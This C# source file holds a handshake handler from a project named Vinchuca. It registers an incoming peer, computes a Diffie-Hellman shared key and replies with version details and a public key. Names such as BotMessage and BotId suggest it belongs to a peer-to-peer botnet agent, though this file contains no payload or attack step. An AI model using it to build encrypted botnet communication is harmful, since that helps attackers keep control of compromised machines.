using System;
using Vinchuca.Crypto;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class HelloSynMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;
        private readonly VersionManager _versionManager;

        public HelloSynMessageHandler(PeerList peerList, MessageManager messageManager, VersionManager _versionManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
            this._versionManager = _versionManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as HelloSynMessage;
            var endpoint = botMessage.Header.EndPoint;

            var peerInfo = new PeerInfo(botMessage.Header.BotId, endpoint);
            if (_peerList.TryRegister(peerInfo))
            {
                peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);

                var reply = new HelloAckSynMessage {
                    BotVersion = _versionManager.AgentVersion,
                    CfgVersion = _versionManager.ConfigurationFileVersion,
                    PublicKey = BotIdentifier.PublicKey,
                };
                _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
            }
        }
    }
}